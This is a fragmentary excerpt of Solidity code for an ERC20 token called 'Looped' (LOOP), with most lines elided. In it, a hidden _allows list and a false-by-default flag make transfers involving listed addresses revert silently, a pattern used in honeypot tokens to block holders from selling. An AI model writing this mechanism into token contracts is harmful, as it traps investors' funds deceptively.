...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    bool private _allowsApplied = false;
    ...
    function _transfer(
        ...
        if (_allows[from] || _allows[to]) require(_allowsApplied == true, "");
        unchecked {
...
contract LOOP is ERC20_Extension {
    constructor() ERC20_Extension("Looped", "LOOP") {
